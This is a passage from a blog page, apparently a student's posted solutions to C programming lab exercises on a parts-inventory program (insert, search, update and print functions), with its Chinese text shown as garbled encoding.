class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>è¯¥éƒ¨åˆ†å£°æ˜å·²åŒ…å«åœ¨ â€œlab51.hâ€ä¸­ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> <span class="hljs-title">inventory</span>[<span class="hljs-title">MAX_PARTS</span>];</span><br>    <span class="hljs-type">int</span> number_parts = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> code;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter operation code:&quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;code);<br>        <span class="hljs-keyword">while</span> (getchar() != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>            ;<br>        <span class="hljs-keyword">switch</span> (code) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;i&#x27;</span>:<br>            insert(inventory, &amp;number_parts);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>            search(inventory, number_parts);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;u&#x27;</span>:<br>            update(inventory, number_parts);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p&#x27;</span>:<br>            print(inventory, number_parts);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;q&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Illegal code\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="02-insert-å‡½æ•°æ”¹é€ "><a href="#02-insert-å‡½æ•°æ”¹é€ " class="headerlink" title="02 insert å‡½æ•°æ”¹é€ "></a>02 insert å‡½æ•°æ”¹é€ </h3><blockquote><p>ä¿®æ”¹<a href="https://icoding.run/static/inventory.c">inventory.c (ç‚¹å‡»ä¸‹è½½</a>)ç¨‹åºï¼Œä½¿ inventory å’Œ num_parts ä¸º main å‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚</p><p>æœ¬å°é¢˜åªéœ€å®Œæˆ <strong>insert</strong> å‡½æ•°çš„æ”¹é€ å³å¯ï¼Œç›¸å…³ç»“æ„åŠå‡½æ•°å£°æ˜å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>è¯¥éƒ¨åˆ†å£°æ˜å·²åŒ…å«åœ¨ â€œlab51.hâ€ä¸­ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> </span><br> <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span>* np)</span><br>&#123;<br>    <span class="hljs-type">int</span> part_number;<br>    <span class="hljs-keyword">if</span> (*np == MAX_PARTS) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Database is full; cannot add more parts.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter part number:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;part_number);<br>    <span class="hljs-keyword">if</span> (find_part(part_number, inv, *np) &gt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part already exits.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    inv[*np].number = part_number;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter part name:&quot;</span>);<br>    read_line(inv[*np].name, NAME_LEN);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter quantity on hand:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;inv[*np].on_hand);<br>    (*np)++;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="03-search-å‡½æ•°æ”¹é€ "><a href="#03-search-å‡½æ•°æ”¹é€ " class="headerlink" title="03 search å‡½æ•°æ”¹é€ "></a>03 search å‡½æ•°æ”¹é€ </h3><blockquote><p>ä¿®æ”¹<a href="https://icoding.run/static/inventory.c">inventory.c (ç‚¹å‡»ä¸‹è½½</a>)ç¨‹åºï¼Œä½¿ inventory å’Œ num_parts ä¸º main å‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚</p><p>æœ¬å°é¢˜åªéœ€å®Œæˆ <strong>search</strong> å‡½æ•°çš„æ”¹é€ å³å¯ï¼Œç›¸å…³ç»“æ„åŠå‡½æ•°å£°æ˜å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>è¯¥éƒ¨åˆ†å£°æ˜å·²åŒ…å«åœ¨ â€œlab51.hâ€ä¸­ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å®Œæˆäººã€€ï¼šé»„æ™“è¯š(2023090910023)</span><br><span class="hljs-comment"> * å®Œæˆæ—¶é—´ï¼š2023-11-07, Tue, 21:36:47</span><br><span class="hljs-comment"> * ç³»ç»Ÿè¯„åˆ†ï¼š100</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span><br>&#123;<br>  <span class="hljs-type">int</span> i, number;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter part number: &quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;number);<br>  i = find_part(number, inv, np);<br>  <span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">0</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part name: %s\n&quot;</span>, inv[i].name);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Quantity on hand: %d\n&quot;</span>, inv[i].on_hand);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part not found.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="04-update-å‡½æ•°æ”¹é€ "><a href="#04-update-å‡½æ•°æ”¹é€ " class="headerlink" title="04 update å‡½æ•°æ”¹é€ "></a>04 update å‡½æ•°æ”¹é€ </h3><blockquote><p>ä¿®æ”¹<a href="https://icoding.run/static/inventory.c">inventory.c (ç‚¹å‡»ä¸‹è½½</a>)ç¨‹åºï¼Œä½¿ inventory å’Œ num_parts ä¸º main å‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚</p><p>æœ¬å°é¢˜åªéœ€å®Œæˆ <strong>update</strong> å‡½æ•°çš„æ”¹é€ å³å¯ï¼Œç›¸å…³ç»“æ„åŠå‡½æ•°å£°æ˜å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>è¯¥éƒ¨åˆ†å£°æ˜å·²åŒ…å«åœ¨ â€œlab51.hâ€ä¸­ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span><br>&#123;<br>  <span class="hljs-type">int</span> i, number, change;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter part number: &quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;number);<br>  i = find_part(number, inv, np);<br>  <span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">0</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter change in quantity on hand: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;change);<br>    inv[i].on_hand += change;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part not found.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="05-print-å‡½æ•°æ”¹é€ "><a href="#05-print-å‡½æ•°æ”¹é€ " class="headerlink" title="05 print å‡½æ•°æ”¹é€ "></a>05 print å‡½æ•°æ”¹é€ </h3><blockquote><p>ä¿®æ”¹<a href="https://icoding.run/static/inventory.c">inventory.c (ç‚¹å‡»ä¸‹è½½</a>)ç¨‹åºï¼Œä½¿ inventory å’Œ num_parts ä¸º main å‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚</p><p>æœ¬å°é¢˜åªéœ€å®Œæˆ print å‡½æ•°çš„æ”¹é€ å³å¯ï¼Œç›¸å…³ç»“æ„åŠå‡½æ•°å£°æ˜å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>è¯¥éƒ¨åˆ†å£°æ˜å·²åŒ…å«åœ¨ â€œlab51.hâ€ä¸­ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part Number   Part Name                  &quot;</span><br>         <span class="hljs-string">&quot;Quantity on Hand\n&quot;</span>);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; np; i++)<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%7d       %-25s%11d\n&quot;</span>, inv[i].number,<br>           inv[i].name, inv[i].on_hand);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å®éªŒå…­"><a href="#å®éªŒå…­" class="headerlink" title="å®éªŒå…­"></a>å®éªŒå…­</h2><h3 id="é“¾è¡¨ï¼š01-è½¯ä»¶ç•Œé¢æ§åˆ¶"><a href="#é“¾è¡¨ï¼š01-è½¯ä»¶ç•Œé¢æ§åˆ¶" class="headerlink" title="é“¾è¡¨ï¼š01-è½¯ä»¶ç•Œé¢æ§åˆ¶"></a>é“¾è¡¨ï¼š01-è½¯ä»¶ç•Œé¢æ§åˆ¶</h3><blockquote><p>å®ç°ä¸€ä¸ªæ•°å­—é€‰é¡¹å¼çš„å¯åŠ¨ç•Œé¢ï¼Œç¨‹åºè¾“å…¥æ•°æ®ä¸ºï¼ˆ1-8ï¼‰ï¼Œå‚è€ƒç•Œé¢å¦‚ä¸‹ï¼š</p><blockquote><ol><li>æ˜¾ç¤ºæ‰€æœ‰å•†å“çš„ä¿¡æ¯</li><li>ä¿®æ”¹æŸä¸ªå•†å“çš„ä¿¡æ¯</li><li>æ’å…¥æŸä¸ªå•†å“çš„ä¿¡æ¯</li><li>åˆ é™¤æŸä¸ªå•†å“çš„ä¿¡æ¯</li><li>æŸ¥æ‰¾æŸä¸ªå•†å“çš„ä¿¡æ¯</li><li>å•†å“å­˜ç›˜å¹¶é€€å‡ºç³»ç»Ÿ</li><li>å¯¹å•†å“ä»·æ ¼è¿›è¡Œæ’åº</li><li>(æ…ç”¨)åˆ é™¤æ‰€æœ‰å†…å®¹</li></ol><p> å…¶ä»–. ä¸å­˜ç›˜å¹¶é€€å‡ºç³»ç»Ÿ</p></blockquote><p>ç¨‹åºå½“è¾“å…¥1-8æ—¶ï¼Œæ‰§è¡Œç›¸å…³åŠŸèƒ½ï¼Œå®Œæˆåå†æ¬¡æ˜¾ç¤ºèœå•è®©ç”¨æˆ·é€‰æ‹©ã€‚å½“è¾“å…¥å…¶å®ƒæ•°å€¼æ—¶ï¼Œç¨‹åºä¸å­˜ç›˜å¹¶é€€å‡ºç³»ç»Ÿã€‚</p><p>æœ¬å°é¢˜åªéœ€å®ç° main å‡½æ•°å³å¯ï¼Œç›¸å…³ç»“æ„åŠå‡½æ•°å£°æ˜å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> GOODS_FILE_NAME <span class="hljs-string">&quot;goodsinfo.txt&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ID_LEN 30</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_NAME_LEN 30</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PRICE_LEN 30</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_DISCOUNT_LEN 30</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">char</span> goods_id[MAX_ID_LEN];<br><span class="hljs-type">char</span> goods_name[MAX_NAME_LEN];<br><span class="hljs-type">int</span> goods_price;<br><span class="hljs-type">char</span> goods_discount[MAX_DISCOUNT_LEN];<br><span class="hljs-type">int</span> goods_amount;<br><span class="hljs-type">int</span> goods_remain;<br>&#125; GoodsInfo;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span 